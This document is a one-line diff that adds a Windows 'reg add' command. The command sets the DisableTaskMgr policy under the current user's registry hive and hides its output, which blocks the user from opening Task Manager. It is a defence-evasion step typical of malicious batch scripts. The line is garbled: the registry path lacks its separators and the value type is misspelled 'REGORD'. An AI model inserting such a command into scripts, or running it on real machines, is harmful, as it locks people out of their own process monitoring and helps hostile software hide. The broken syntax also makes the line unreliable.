@@ -1,0 +1,1 @@
+reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableTaskMgr /t REGORD /d 1 /f >nul 
